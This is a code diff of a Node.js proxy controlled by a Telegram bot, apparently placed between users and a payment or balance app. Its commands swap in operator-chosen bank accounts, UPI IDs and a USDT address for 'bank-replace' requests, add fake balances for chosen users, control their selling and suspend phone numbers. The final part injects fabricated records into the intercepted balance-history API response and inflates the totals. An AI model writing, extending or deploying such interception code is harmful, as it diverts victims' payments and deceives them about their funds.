@@ -38,7 +38,7 @@ if (REDIS_URL && REDIS_TOKEN) {
 
 let cachedData = null;
 let cacheTime = 0;
-const CACHE_TTL = 15000;
+const CACHE_TTL = 5000;
 const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
@@ -93,21 +93,7 @@ async function saveData(data) {
           }
         }
         if (current.userOverrides) {
-          if (!data.userOverrides) data.userOverrides = {};
-          for (const uid of Object.keys(current.userOverrides)) {
-            const cur = current.userOverrides[uid];
-            const loc = data.userOverrides[uid];
-            if (!loc) {
-              data.userOverrides[uid] = cur;
-            } else {
-              if (cur.addedBalance !== undefined && loc.addedBalance === undefined) {
-                loc.addedBalance = cur.addedBalance;
-              }
-              if (cur.quotaRecords && cur.quotaRecords.length > 0 && (!loc.quotaRecords || loc.quotaRecords.length === 0)) {
-                loc.quotaRecords = cur.quotaRecords;
-              }
-            }
-          }
+          data.userOverrides = JSON.parse(JSON.stringify(current.userOverrides));
         }
         if (current.balanceHistory && Array.isArray(current.balanceHistory)) {
           if (!data.balanceHistory || data.balanceHistory.length < current.balanceHistory.length) {
@@ -733,16 +719,17 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text === '/on') { data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
-    if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
-    if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
+    if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
+    if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
@@ -771,6 +758,7 @@ Example:
     if (text.startsWith('/on log ')) {
       const targetId = text.substring(8).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /on log <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId]) {
         delete data.userOverrides[targetId].logOff;
         data._skipOverrideMerge = true;
@@ -841,7 +829,10 @@ Example:
       });
       freshData._skipOverrideMerge = true;
       await saveData(freshData);
-      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
+      const statusMsg = tracked
+        ? `📊 Updated balance: ₹${updatedBal}`
+        : `⏳ User is offline — ₹${freshData.userOverrides[targetUserId].addedBalance} will show when they open the app`;
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n${statusMsg}`);
       return res.sendStatus(200);
     }
 
@@ -896,6 +887,7 @@ Example:
     if (text.startsWith('/remove balance ')) {
       const targetId = text.substring(16).trim();
       if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
         const removed = data.userOverrides[targetId].addedBalance;
         delete data.userOverrides[targetId].addedBalance;
@@ -924,6 +916,7 @@ Example:
     if (text.startsWith('/control sell ')) {
       const sellTargetId = text.substring(14).trim();
       if (!sellTargetId) { await bot.sendMessage(chatId, '❌ Format: /control sell <userId>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[sellTargetId]) data.userOverrides[sellTargetId] = {};
       const currentState = !!data.userOverrides[sellTargetId].sellControl;
@@ -1010,6 +1003,7 @@ Example:
     }
 
     if (text === '/clearhistory') {
+      data = await loadData(true);
       data.balanceHistory = [];
       data._skipOverrideMerge = true;
       await saveData(data);
@@ -1047,6 +1041,7 @@ Example:
     if (text.startsWith('/addbank ')) {
       const parts = text.substring(9).split('|').map(s => s.trim());
       if (parts.length < 3) { await bot.sendMessage(chatId, '❌ Format: /addbank Name|AccNo|IFSC|BankName|UPI\n(BankName and UPI optional)'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.banks.length >= 10) { await bot.sendMessage(chatId, '❌ Max 10 banks.'); return res.sendStatus(200); }
       const newBank = { accountHolder: parts[0], accountNo: parts[1], ifsc: parts[2], bankName: parts[3] || '', upiId: parts[4] || '' };
       data.banks.push(newBank);
@@ -1058,6 +1053,7 @@ Example:
     }
 
     if (text.startsWith('/removebank ')) {
+      data = await loadData(true);
       const idx = parseInt(text.substring(12).trim()) - 1;
       if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid. /banks se check karo'); return res.sendStatus(200); }
       const removed = data.banks.splice(idx, 1)[0];
@@ -1079,17 +1075,20 @@ Example:
     }
 
     if (text.startsWith('/setbank ')) {
+      data = await loadData(true);
       const idx = parseInt(text.substring(9).trim()) - 1;
       if (isNaN(idx) || idx < 0 || idx >= (data.banks || []).length) { await bot.sendMessage(chatId, '❌ Invalid index'); return res.sendStatus(200); }
       data.activeIndex = idx;
       data._skipOverrideMerge = true;
       await saveData(data);
-      await bot.sendMessage(chatId, `✅ Active bank #${idx + 1}: ${data.banks[idx].accountHolder}`);
+      const bankInfo = data.banks[idx];
+      await bot.sendMessage(chatId, `✅ Active bank set to #${idx + 1}:\n${bankInfo.accountHolder} | ${bankInfo.accountNo} | ${bankInfo.ifsc}${bankInfo.bankName ? ' | ' + bankInfo.bankName : ''}`);
       return res.sendStatus(200);
     }
 
     if (text.startsWith('/usdt ')) {
       const addr = text.substring(6).trim();
+      data = await loadData(true);
       if (addr.toLowerCase() === 'off') {
         data.usdtAddress = '';
         data._skipOverrideMerge = true;
@@ -1110,6 +1109,7 @@ Example:
     if (text.startsWith('/suspend ')) {
       const suspendPhone = text.substring(9).trim();
       if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (!data.suspendedPhones) data.suspendedPhones = {};
       data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
       data._skipOverrideMerge = true;
@@ -1121,6 +1121,7 @@ Example:
     if (text.startsWith('/unsuspend ')) {
       const unsuspendPhone = text.substring(11).trim();
       if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
+      data = await loadData(true);
       if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
         delete data.suspendedPhones[unsuspendPhone];
         data._skipOverrideMerge = true;
@@ -2045,8 +2046,34 @@ app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
           }
         }
         targetArr.forEach(applyToItem);
+      } else if (shouldInject && typeof listData === 'object' && !Array.isArray(listData)) {
+        const arrKeys = ['lists', 'list', 'records', 'rows', 'content'];
+        let injected = false;
+        for (const ak of arrKeys) {
+          if (listData[ak] !== undefined) {
+            if (!Array.isArray(listData[ak])) listData[ak] = [];
+            listData[ak].unshift(...fakeRecords);
+            if (listData.total !== undefined) listData.total += fakeRecords.length;
+            if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+            if (listData.totalElements !== undefined) listData.totalElements += fakeRecords.length;
+            injected = true;
+            break;
+          }
+        }
+        if (!injected) {
+          listData.lists = [...fakeRecords];
+          if (listData.total !== undefined) listData.total += fakeRecords.length;
+          if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
+        }
       } else if (typeof listData === 'object') {
         applyToItem(listData);
+      }
+    } else if (shouldInject && jsonResp) {
+      const rd = jsonResp.data || jsonResp.result || jsonResp;
+      if (rd && typeof rd === 'object' && !Array.isArray(rd)) {
+        rd.lists = [...fakeRecords];
+      } else if (jsonResp.data === null || jsonResp.data === undefined) {
+        jsonResp.data = { lists: [...fakeRecords], total: fakeRecords.length };
       }
     }
 
